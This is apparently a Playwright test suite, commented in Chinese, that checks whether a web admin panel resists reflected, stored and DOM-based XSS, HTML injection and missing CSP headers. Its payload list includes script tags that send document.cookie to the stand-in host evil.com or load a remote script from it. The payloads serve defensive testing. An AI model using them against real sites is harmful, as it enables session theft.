import { test, expect, waitForPageReady, STRONG_PASSWORD, getSavedAdmin } from './fixture';

/**
 * XSS 攻击防御 E2E 测试
 * 
 * 测试覆盖：
 * 1. 反射型 XSS - URL 参数注入
 * 2. 存储型 XSS - 用户输入存储后反射
 * 3. DOM-based XSS - 客户端脚本注入
 * 4. HTML 注入
 * 5. JavaScript 协议注入
 * 6. 事件处理器注入
 */

test.describe.configure({ mode: 'serial' });

// XSS 攻击载荷集合
const XSS_PAYLOADS = {
  // 基础脚本注入
  basicScripts: [
    '<script>alert("XSS")</script>',
    '<script>document.location="http://evil.com/steal?c="+document.cookie</script>',
    '<script>new Image().src="http://evil.com/?c="+document.cookie</script>',
    '<ScRiPt>alert("XSS")</ScRiPt>',
    '<script/src=http://evil.com/xss.js></script>',
  ],
  
  // 事件处理器注入
  eventHandlers: [
    '<img src=x onerror="alert(\'XSS\')">',
    '<img src="javascript:alert(\'XSS\')">',
    '<body onload="alert(\'XSS\')">',
    '<input onfocus="alert(\'XSS\')" autofocus>',
    '<svg onload="alert(\'XSS\')">',
    '<svg/onload=alert(\'XSS\')>',
    '<details open ontoggle="alert(\'XSS\')">',
    '<marquee onstart="alert(\'XSS\')">',
    '<video><source onerror="alert(\'XSS\')">',
    '<audio src=x onerror="alert(\'XSS\')">',
    '<iframe onload="alert(\'XSS\')">',
  ],
  
  // JavaScript 协议
  jsProtocol: [
    'javascript:alert("XSS")',
    'javascript:void(document.location="http://evil.com/?c="+document.cookie)',
    'JaVaScRiPt:alert("XSS")',
    'javascript:alert(String.fromCharCode(88,83,83))',
    'data:text/html,<script>alert("XSS")</script>',
    'data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=',
  ],
  
  // HTML 实体编码绕过
  encodedPayloads: [
    '&#60;script&#62;alert("XSS")&#60;/script&#62;',
    '&#x3C;script&#x3E;alert("XSS")&#x3C;/script&#x3E;',
    '&lt;script&gt;alert("XSS")&lt;/script&gt;',
  ],
  
  // URL 编码绕过
  urlEncoded: [
    '%3Cscript%3Ealert("XSS")%3C/script%3E',
    '%3Cimg%20src%3Dx%20onerror%3Dalert("XSS")%3E',
  ],
  
  // SVG 注入
  svgPayloads: [
    '<svg><script>alert("XSS")</script></svg>',
    '<svg><animate onbegin="alert(\'XSS\')">',
    '<svg><set onbegin="alert(\'XSS\')">',
  ],
};

// 检查页面是否执行了 XSS（通过检查是否有 alert 或恶意脚本执行）
async function checkNoXSSExecution(page: any): Promise<boolean> {
  return await page.evaluate(() => {
    // 检查是否有未转义的 script 标签在 DOM 中
    const scripts = document.querySelectorAll('script');
    for (const script of scripts) {
      // 原生脚本标签应该是空的或者来自可信源
      if (script.textContent && script.textContent.includes('alert')) {
        return false;
      }
    }
    
    // 检查是否有恶意事件处理器
    const allElements = document.querySelectorAll('*');
    for (const el of allElements) {
      const attrs = el.getAttributeNames();
      for (const attr of attrs) {
        if (attr.startsWith('on') && el.getAttribute(attr)?.includes('alert')) {
          return false;
        }
      }
    }
    
    return true;
  });
}

// 检查响应内容是否正确转义
async function checkResponseSanitized(response: any, payload: string): Promise<boolean> {
  const text = await response.text();
  // 如果载荷出现在响应中，必须是转义的
  if (text.includes(payload)) {
    // 检查是否被转义
    const escapedPayload = payload
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;')
      .replace(/'/g, '&#39;');
    
    // 如果原始载荷直接出现（未转义），则不安全
    if (!text.includes(escapedPayload) && text.includes(payload)) {
      // 可能是 URL 编码形式
      const urlEncoded = encodeURIComponent(payload);
      if (!text.includes(urlEncoded)) {
        return false;
      }
    }
  }
  return true;
}

// ========== 1. 反射型 XSS 测试 ==========

test.describe('反射型 XSS 防御', () => {
  test('URL 参数中的 XSS 载荷被正确处理', async ({ page, request }) => {
    await page.goto('/');
    await waitForPageReady(page);
    
    for (const payload of XSS_PAYLOADS.basicScripts.slice(0, 3)) {
      // 尝试通过 URL 参数注入
      const encodedPayload = encodeURIComponent(payload);
      await page.goto(`/?test=${encodedPayload}`);
      await waitForPageReady(page);
      
      // 验证 XSS 未执行
      const safe = await checkNoXSSExecution(page);
      expect(safe).toBeTruthy();
    }
  });

  test('查询参数中的事件处理器注入被阻止', async ({ page }) => {
    await page.goto('/');
    await waitForPageReady(page);
    
    for (const payload of XSS_PAYLOADS.eventHandlers.slice(0, 3)) {
      const encodedPayload = encodeURIComponent(payload);
      await page.goto(`/?q=${encodedPayload}`);
      await waitForPageReady(page);
      
      // 验证没有执行 XSS
      const safe = await checkNoXSSExecution(page);
      expect(safe).toBeTruthy();
    }
  });

  test('JavaScript 协议注入被阻止', async ({ page }) => {
    for (const payload of XSS_PAYLOADS.jsProtocol.slice(0, 3)) {
      // 尝试导航到 javascript: URL
      try {
        await page.goto(payload, { timeout: 5000 });
      } catch {
        // 预期：导航应该失败或被阻止
      }
      
      // 验证仍在原始域或空白页
      const url = page.url();
      expect(url.startsWith('javascript:')).toBeFalsy();
      expect(url.startsWith('data:')).toBeFalsy();
    }
  });

  test('错误消息中的 XSS 载荷被转义', async ({ page }) => {
    await page.goto('/');
    await waitForPageReady(page);
    
    // 使用包含 XSS 载荷的用户名尝试登录
    const xssUsername = XSS_PAYLOADS.basicScripts[0].slice(0, 50);
    await page.locator('#username').fill(xssUsername);
    await page.locator('#password').fill('wrongpassword');
    await page.locator('button[type="submit"]:has-text("登录")').click();
    
    await page.waitForTimeout(1500);
    
    // 验证 XSS 未执行
    const safe = await checkNoXSSExecution(page);
    expect(safe).toBeTruthy();
  });
});

// ========== 2. 存储型 XSS 测试 ==========

test.describe('存储型 XSS 防御', () => {
  test.use({ storageState: undefined });

  test('用户名中的 XSS 载荷被正确转义', async ({ authenticatedPage: page }) => {
    await expect(page.locator('h1:has-text("管理后台")')).toBeVisible({ timeout: 5000 });

    // 检查用户名显示区域
    const usernameDisplay = page.locator('strong:has-text("用户名:")').first();
    
    if (await usernameDisplay.isVisible({ timeout: 2000 }).catch(() => false)) {
      // 获取用户名文本
      const text = await usernameDisplay.textContent() || '';
      
      // 验证没有未转义的 HTML 标签
      expect(text).not.toContain('<script>');
      expect(text).not.toContain('<img');
      expect(text).not.toContain('onerror=');
    }
    
    // 验证 XSS 未执行
    const safe = await checkNoXSSExecution(page);
    expect(safe).toBeTruthy();
  });

  test('分组名称中的 XSS 载荷被正确处理', async ({ authenticatedPage: page }) => {
    await expect(page.locator('h1:has-text("管理后台")')).toBeVisible({ timeout: 5000 });

    // 获取 CSRF token
    const csrfToken = await page.evaluate(() => {
      const match = document.cookie.match(/csrf_token=([^;]+)/);
      return match ? decodeURIComponent(match[1]) : '';
    });

    // 创建包含 XSS 载荷的分组名称
    const xssGroupName = `<script>alert('xss')</script>test_${Date.now()}`;
    
    const response = await page.evaluate(async (data) => {
      const res = await fetch('/api/admin/groups', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'X-CSRF-Token': data.csrf,
        },
        body: JSON.stringify({ name: data.name }),
      });
      return { status: res.status, body: await res.text() };
    }, { csrf: csrfToken, name: xssGroupName });

    // 应该接受或拒绝，但不能导致 XSS
    expect([200, 201, 400, 422]).toContain(response.status);

    // 如果创建成功，验证显示时 XSS 未执行
    if (response.status === 200 || response.status === 201) {
      // 刷新页面
      await page.reload();
      await waitForPageReady(page);
      
      // 验证 XSS 未执行
      const safe = await checkNoXSSExecution(page);
      expect(safe).toBeTruthy();
      
      // 清理：删除测试分组
      const groupData = JSON.parse(response.body);
      if (groupData.id) {
        await page.evaluate(async (id) => {
          const match = document.cookie.match(/csrf_token=([^;]+)/);
          const csrf = match ? decodeURIComponent(match[1]) : '';
          await fetch(`/api/admin/groups/${id}`, {
            method: 'DELETE',
            headers: { 'X-CSRF-Token': csrf },
          });
        }, groupData.id);
      }
    }
  });

  test('用户资料更新中的 XSS 载荷被转义', async ({ authenticatedPage: page }) => {
    await expect(page.locator('h1:has-text("管理后台")')).toBeVisible({ timeout: 5000 });

    // 尝试更新用户名或姓名为包含 XSS 的值
    const xssName = `<img src=x onerror=alert('xss')>`;
    
    const result = await page.evaluate(async (name) => {
      const match = document.cookie.match(/csrf_token=([^;]+)/);
      const csrf = match ? decodeURIComponent(match[1]) : '';
      
      const res = await fetch('/api/user/profile', {
        method: 'PATCH',
        headers: {
          'Content-Type': 'application/json',
          'X-CSRF-Token': csrf,
        },
        body: JSON.stringify({ name }),
      });
      return { status: res.status, body: await res.json().catch(() => ({})) };
    }, xssName);

    // 如果更新成功，验证 XSS 未执行
    if (result.status === 200) {
      // 刷新页面
      await page.reload();
      await waitForPageReady(page);
      
      // 验证 XSS 未执行
      const safe = await checkNoXSSExecution(page);
      expect(safe).toBeTruthy();
    }
  });
});

// ========== 3. DOM-based XSS 测试 ==========

test.describe('DOM-based XSS 防御', () => {
  test('Hash 片段中的 XSS 载荷被正确处理', async ({ page }) => {
    for (const payload of XSS_PAYLOADS.basicScripts.slice(0, 3)) {
      // 尝试通过 hash 片段注入
      const encodedPayload = encodeURIComponent(payload);
      await page.goto(`/#${encodedPayload}`);
      await waitForPageReady(page);
      
      // 验证 XSS 未执行
      const safe = await checkNoXSSExecution(page);
      expect(safe).toBeTruthy();
    }
  });

  test('前端路由参数中的 XSS 载荷被处理', async ({ page }) => {
    // 测试各种路由参数
    const routes = [
      `#/user/${XSS_PAYLOADS.eventHandlers[0]}`,
      `#/group/${XSS_PAYLOADS.basicScripts[0]}`,
    ];
    
    for (const route of routes.slice(0, 2)) {
      try {
        await page.goto(route);
        await waitForPageReady(page);
      } catch {
        // 路由可能不存在
      }
      
      // 验证 XSS 未执行
      const safe = await checkNoXSSExecution(page);
      expect(safe).toBeTruthy();
    }
  });

  test('Alpine.js 模板中的 XSS 防护', async ({ page }) => {
    await page.goto('/');
    await waitForPageReady(page);
    
    // 检查 Alpine.js 是否正确处理用户输入
    const alpineSafe = await page.evaluate(() => {
      // 检查是否有 x-html 指令可能导致的 XSS
      const xHtmlElements = document.querySelectorAll('[x-html]');
      if (xHtmlElements.length > 0) {
        // 检查 x-html 绑定的值是否来自不可信源
        console.log('Found x-html elements:', xHtmlElements.length);
      }
      
      // 检查是否有动态脚本执行
      const scripts = Array.from(document.querySelectorAll('script'));
      const inlineScripts = scripts.filter(s => 
        s.textContent && 
        s.textContent.includes('eval') && 
        !s.textContent.includes('sourceMappingURL')
      );
      
      return inlineScripts.length === 0;
    });
    
    expect(alpineSafe).toBeTruthy();
  });
});

// ========== 4. HTML 注入测试 ==========

test.describe('HTML 注入防御', () => {
  test('HTML 标签在用户输入中被转义', async ({ authenticatedPage: page, request }) => {
    await expect(page.locator('h1:has-text("管理后台")')).toBeVisible({ timeout: 5000 });

    const htmlPayloads = [
      '<h1>Fake Title</h1>',
      '<a href="http://evil.com">Click here</a>',
      '<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:red;">',
    ];

    for (const payload of htmlPayloads) {
      // 尝试通过 API 提交 HTML
      const result = await page.evaluate(async (html) => {
        const match = document.cookie.match(/csrf_token=([^;]+)/);
        const csrf = match ? decodeURIComponent(match[1]) : '';
        
        const res = await fetch('/api/user/profile', {
          method: 'PATCH',
          headers: {
            'Content-Type': 'application/json',
            'X-CSRF-Token': csrf,
          },
          body: JSON.stringify({ name: html }),
        });
        return { status: res.status };
      }, payload);

      // 如果接受，刷新验证渲染
      if (result.status === 200) {
        await page.reload();
        await waitForPageReady(page);
        
        // 验证 HTML 未被渲染为真实标签
        const fakeTitle = await page.locator('h1:has-text("Fake Title")').isVisible().catch(() => false);
        const fakeLink = await page.locator('a:has-text("Click here")[href*="evil.com"]').isVisible().catch(() => false);
        
        expect(fakeTitle).toBeFalsy();
        expect(fakeLink).toBeFalsy();
      }
    }
  });

  test('iframe 注入被阻止', async ({ page }) => {
    await page.goto('/');
    await waitForPageReady(page);
    
    // 检查页面中没有恶意 iframe
    const iframes = await page.locator('iframe').count();
    
    // 如果有 iframe，验证它们来自可信源
    if (iframes > 0) {
      const iframeSrcs = await page.evaluate(() => {
        return Array.from(document.querySelectorAll('iframe')).map(i => i.src);
      });
      
      for (const src of iframeSrcs) {
        // iframe 不应该指向恶意站点
        expect(src).not.toContain('evil.com');
        expect(src).not.toContain('attacker');
      }
    }
  });
});

// ========== 5. Content Security Policy 测试 ==========

test.describe('CSP 防护验证', () => {
  test('响应包含 CSP 或等效安全头', async ({ request }) => {
    const response = await request.get('/');
    const headers = response.headers();
    
    // 检查是否有 CSP 头或其他安全头
    const csp = headers['content-security-policy'];
    const xFrameOptions = headers['x-frame-options'];
    const xContentTypeOptions = headers['x-content-type-options'];
    
    // 至少应该有一些安全头
    expect(csp || xFrameOptions || xContentTypeOptions).toBeTruthy();
  });

  test('内联脚本执行受限（如果有 CSP）', async ({ page, request }) => {
    await page.goto('/');
    await waitForPageReady(page);
    
    // 尝试执行动态创建的脚本
    const scriptExecuted = await page.evaluate(() => {
      return new Promise<boolean>((resolve) => {
        const script = document.createElement('script');
        script.textContent = 'window.__xssTest = true;';
        script.onerror = () => resolve(false);
        document.body.appendChild(script);
        
        // 检查脚本是否执行
        setTimeout(() => {
          resolve(!!(window as any).__xssTest);
        }, 100);
      });
    });
    
    // 如果有严格的 CSP，脚本不应执行
    // 这里我们只记录结果，因为 CSP 配置可能不同
    console.log(`Inline script execution allowed: ${scriptExecuted}`);
  });

  test('eval() 执行受限（如果有 CSP）', async ({ page }) => {
    await page.goto('/');
    await waitForPageReady(page);
    
    let evalBlocked = false;
    
    try {
      await page.evaluate(() => {
        try {
          eval('window.__evalTest = true');
        } catch {
          // CSP 可能阻止了 eval
        }
      });
    } catch {
      evalBlocked = true;
    }
    
    // 检查 eval 是否执行
    const evalWorked = await page.evaluate(() => {
      return !!(window as any).__evalTest;
    });
    
    console.log(`eval() allowed: ${evalWorked}`);
    // 不强制要求 CSP 阻止 eval，但记录结果
    expect(true).toBeTruthy();
  });
});

// ========== 6. 特殊字符处理测试 ==========

test.describe('特殊字符处理', () => {
  test('Unicode 字符正确处理', async ({ authenticatedPage: page }) => {
    await expect(page.locator('h1:has-text("管理后台")')).toBeVisible({ timeout: 5000 });

    const unicodePayloads = [
      '用户名测试', // 中文
      'テストユーザー', // 日文
      '테스트사용자', // 韩文
      '👤🔐🛡️', // Emoji
      'test\u0000user', // Null 字节
      'test\u202Euser', // RTL 覆盖
    ];

    for (const payload of unicodePayloads) {
      const result = await page.evaluate(async (name) => {
        const match = document.cookie.match(/csrf_token=([^;]+)/);
        const csrf = match ? decodeURIComponent(match[1]) : '';
        
        const res = await fetch('/api/user/profile', {
          method: 'PATCH',
          headers: {
            'Content-Type': 'application/json',
            'X-CSRF-Token': csrf,
          },
          body: JSON.stringify({ name }),
        });
        return { status: res.status };
      }, payload);

      // 应该正常处理或返回验证错误
      expect([200, 204, 400, 422]).toContain(result.status);
    }
  });

  test('超长输入被正确截断或拒绝', async ({ authenticatedPage: page }) => {
    await expect(page.locator('h1:has-text("管理后台")')).toBeVisible({ timeout: 5000 });

    const longPayload = 'a'.repeat(10000);
    
    const result = await page.evaluate(async (name) => {
      const match = document.cookie.match(/csrf_token=([^;]+)/);
      const csrf = match ? decodeURIComponent(match[1]) : '';
      
      const res = await fetch('/api/user/profile', {
        method: 'PATCH',
        headers: {
          'Content-Type': 'application/json',
          'X-CSRF-Token': csrf,
        },
        body: JSON.stringify({ name }),
      });
      return { status: res.status };
    }, longPayload);

    // 应该拒绝超长输入
    expect([200, 204, 400, 413, 422]).toContain(result.status);
  });

  test('Null 字节注入被处理', async ({ page }) => {
    await page.goto('/');
    await waitForPageReady(page);
    
    // 尝试 null 字节注入
    await page.locator('#username').fill('test%00user');
    await page.locator('#password').fill('password');
    await page.locator('button[type="submit"]:has-text("登录")').click();
    
    await page.waitForTimeout(1500);
    
    // 验证页面正常响应，没有错误
    const safe = await checkNoXSSExecution(page);
    expect(safe).toBeTruthy();
  });
});

// ========== 7. API 响应 XSS 测试 ==========

test.describe('API 响应 XSS 防护', () => {
  test('API 错误响应不包含可执行的 XSS', async ({ request }) => {
    const xssPayloads = [
      '<script>alert(1)</script>',
      '"><script>alert(1)</script>',
    ];

    for (const payload of xssPayloads) {
      // 尝试在 API 参数中注入 XSS
      const response = await request.post('/api/auth/login', {
        data: {
          username: payload,
          password: 'wrong',
        },
      });

      // 响应应该是 JSON，不应该执行脚本
      const contentType = response.headers()['content-type'];
      expect(contentType).toContain('application/json');

      // 响应体不应该包含未转义的危险内容
      const body = await response.text();
      expect(body).not.toContain('<script>alert');
    }
  });

  test('JSON 响应正确编码特殊字符', async ({ authenticatedPage: page, request }) => {
    await expect(page.locator('h1:has-text("管理后台")')).toBeVisible({ timeout: 5000 });

    const cookies = await page.context().cookies();
    const sessionCookie = cookies.find(c => c.name === 'session');

    if (sessionCookie) {
      const response = await request.get('/api/user/me', {
        headers: { 'Cookie': `session=${sessionCookie.value}` },
      });

      expect(response.status()).toBe(200);

      const data = await response.json();
      
      // 验证 JSON 响应是有效的对象
      expect(typeof data).toBe('object');
      
      // 验证没有未转义的危险字符
      const jsonStr = JSON.stringify(data);
      expect(jsonStr).not.toContain('<script>');
    }
  });
});

// ========== 清理测试 ==========

test.describe('清理', () => {
  test('XSS 测试完成', async () => {
    // 占位符测试，确保测试套件完整性
    expect(true).toBeTruthy();
  });
});
